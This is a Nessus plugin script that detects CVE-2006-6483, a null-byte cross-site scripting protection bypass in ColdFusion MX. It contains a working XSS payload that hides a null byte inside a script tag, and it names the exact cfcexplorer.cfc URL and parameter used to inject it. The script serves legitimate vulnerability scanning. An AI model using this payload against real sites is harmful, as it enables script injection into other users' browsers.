#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24279);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-6483");
  script_bugtraq_id(21532);
  script_xref(name:"OSVDB", value:"31054");

  script_name(english:"ColdFusion MX Null Byte Tag Cross-Site Scripting Protection Bypass");
  script_summary(english:"Checks for an XSS flaw in ColdFusion");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server contains a script that fails to completely
sanitize user input before using it to generate dynamic content.  An
unauthenticated remote attacker may be able to leverage this issue to
inject arbitrary HTML or script code into a user's browser to be
executed within the security context of the affected site." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2006-12/0203.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb07-06.html" );
 script_set_attribute(attribute:"solution", value:
"Update to ColdFusion MX 7.0.2 if necessary and apply the hotfix
referenced in the vendor advisory above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Make sure it's ColdFusion.
url = "/CFIDE/administrator/index.cfm";

res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(1, "The remote web server failed to respond.");

if ("ColdFusion Administrator Login" >!< res[2]) exit(0);


# Send a request to exploit the flaw.
xss = raw_string("<", 0, "script>alert('", SCRIPT_NAME, "')</script>");
exss = urlencode(
  str:xss,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/=;<>"
);

url = string(
  '/CFIDE/componentutils/cfcexplorer.cfc?',
  'method=getcfcinhtmtestl&',
  'name=CFIDE.adminapi.administrator&',
  'path=/cfide/adminapi/administrator.cfctest">', exss
);

res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(1, "The remote web server failed to respond.");


# There's a problem if our exploit appears in 'faultactor' as-is.
if (egrep(pattern:string('form name="loginform" action=".+', xss, '.+ method="POST"'), string:res[2]))
{
  if (report_verbosity > 0)
  {
    report = string(
      "\n",
      "Nessus was able to exploit the issue using the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n",
      "\n",
      "Note that this attack is known to work against users of Internet\n",
      "Explorer.  Other browsers might not be affected.\n"
    );
    security_note(port:port, extra:report);
  }
  else security_note(port);
  set_kb_item(name:'www/'+port+'/XSS', value: TRUE);
}
else exit(0, "The ColdFusion install running on this port is not affected.");
